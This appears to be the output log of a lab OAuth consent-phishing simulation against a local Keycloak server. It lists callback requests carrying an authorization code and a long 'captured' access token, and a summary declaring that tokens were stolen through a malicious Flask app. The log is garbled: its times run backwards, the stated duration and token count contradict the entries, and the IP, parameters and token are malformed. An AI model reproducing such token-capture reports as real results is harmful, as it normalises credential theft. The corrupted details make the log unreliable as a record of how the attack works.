OAUTH ATTACK SIMULATION - CAPTURED CREDENTIALS
===============================================
Date: 16/Sep/2026 03:59:40 - 03:59:18
Attack Type: Illicit Consent Grant / OAuth App Phishing

[!] SUCCESS! CAPTURED OAUTH TOKENS:
Access Token: None

HTTP Requests Log:
==================

Request 1:
Source: 192.168.20.3
Time: [16/Sep/2026 03:59:40]
Method: GET
Endpoint: /callback?session_state=249a5b37-a948-48a5-9967-90
Parameters: 8b26eb7f4bbiss=http://192.168.3:8082/realms/mastercode=61bb51a8-eeb6-4b32-9fb0-b7d34801fea0
Response: 249a5b37-a948-48a5-9967-908b26eb7f4b.9008adf1-eeec-4f34-988b-84de64f7309d
HTTP/1.1 200

Request 2:
Source: 192.168.20.3
Time: [16/Sep/2026 03:59:16]
Method: GET
Endpoint: / HTTP/1.1
Response: 200

[!] SUCCESS! CAPTURED OAUTH TOKENS:
Access Token: eyJhbGciOiJSUzI1NiIsInR5cC6IAi1sldUiiwia21ki1A6ICJ5bHNYdWNUE96YXQxeGI5MkdvdJ1tU
cdhZzXDUvn3ouDhUqibqM3a2FTPm0+zPI1e4jQJ5t3OkthDCdmWHIsndpBJDdj3MKqnzJMcay2c01+Ax
Nzg5NTQzNzU1LCJqdk1OiJ1z3Rk2Ld1Ny0x0mLU1Q2Q1trU0c10S1mNTbN2YSYzZkNmEiLJpc3Mi0ijodHRw0i8vWTk
vjLfZ0e-vNEzq93qo0iDtxrkhbds1z1Znc3sihzFizzFidEniF3Zy91bmdL5l2cHJui03iKoO01ZmAixy0zQ01HiT02d0
ItY1N3jMc02N2NktNHM4Nt2Yt3Fiiic3FnC1A1ai3lCzWFyZXI1LCNenA1DiJtYWxyP21udXMtYW8iiwic2Vzcz1vD19zdGFoZ
sGEiT1IEqY1M91kLk5Dbct3bDUhNS3bDY3A1jExod5lvNlXJNjlZXFi1HsT1iZ11c3Mj1GzNgY1aodM3Pnol9nLbI
aRRocDovL2E5Miw4N1guNDAUJojMDAw1i0s1n1lYWxtZFJV2Vzcl6ey-Jyb2x1cvlGWyJkZWFhdWxLJvbGVzLWi1Ic3R
1c1iSim9mZexpbdYrWM1Z0Xz1iw1dW1bX2Fldghvcmlt0YXRpb24iXx0s1n1lc29icmNtX2FjY2Vzc1i6eyJhY2NtdWN5dI
j7ilbx0icycH1zdTm1ht3t1znc3Fvbw0s9Dl1cuWujtWvjWultbIF1y29ibmQciRbNJRU2CJ2aWV3LXByb2ZpbGUiYXl9LCJzY
29wZSI61mdw2WSp2CBwcm9maNw1lGVtYw1S1iw1c2lkTjoimjQ5vYlMzc1Yk0OC0OiGE1lTk5NjctU0TAyT3lZzW13Z3l1
iiw1ZW1taWkHmMNkRZDAzW3lcgpk1b0i1llmxl5vqRZNjLysbR0iJlzN2NdaOi61i6LM5sYr0KEjqiK4lbmeFu5S
rJi7zq0lPmR3z8aQcAQ8CqaDsxQRD-HdH1bQ46BUdxSL0pTX-gH1czE_HZbecBFXP-ekaS9Tnnq04dRVK-dSB6FoyFAWAg
z2vU8nxbdVzRspNFjZDqgWlcbJqFnJqedQy5Fmdei-c0JvJvAGo5w8flPj2c66O2pJEZDI2bQGXe3s1itvg-Er4t2i_oisgm23
14lajqQi1jrtGUP_3U5tAZUi987GRDwca3gdhPFsSVsLrVlQjicSv_fMFFvk1tboeh1VEgg0VAE64hM_yiEOVwGbHNdtCQh
2V3G0VtX0jAic5CpZXkoeFJlFXSkJN27n8REMrIQ


Request 3:
Source: 192.168.20.3
Time: [16/Sep/2026 03:59:18]
Method: GET
Endpoint: /callback?session_state=249a5b37-a948-48a5-9967-90
Parameters: 8b26eb7f4bbiss=http://192.168.3:8082/realms/master
Response: code=61bb51a8-eeb6-4b32-9fb0-b7d34801fea0
HTTP/1.1 200

===============================================
ATTACK SUMMARY
===============================================
Total Tokens Captured: 2
Attack Duration: ~2 minutes (03:59:16 - 03:59:40)
Target System: Keycloak Identity Provider (Local)
Attack Vector: OAuth 2.0 Authorization Code Flow Exploitation
Status: SUCCESSFUL - Tokens extracted via malicious Flask app
